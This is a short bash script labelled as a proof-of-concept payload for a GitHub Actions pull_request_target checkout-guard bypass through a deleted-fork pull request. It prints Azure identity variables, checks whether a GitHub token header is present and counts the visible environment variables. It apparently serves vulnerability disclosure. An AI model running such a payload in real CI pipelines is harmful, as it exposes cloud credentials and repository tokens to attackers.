#!/usr/bin/env bash
# PoC payload (checkout guard bypass — deleted-fork PR)
echo "=== PWNED: running attacker ci/build.sh in TRUSTED pull_request_target context ==="
echo "AZURE_CLIENT_ID=$AZURE_CLIENT_ID"
echo "AZURE_TENANT_ID=$AZURE_TENANT_ID"
echo "AZURE_SUBSCRIPTION_ID=$AZURE_SUBSCRIPTION_ID"
echo "RUNNER_CAN_ACCESS_GITHUB_TOKEN: $(git config --get http.https://github.com/.extraheader >/dev/null 2>&1 && echo yes || echo no)"
env | grep -cE "." | xargs echo "env vars visible:"
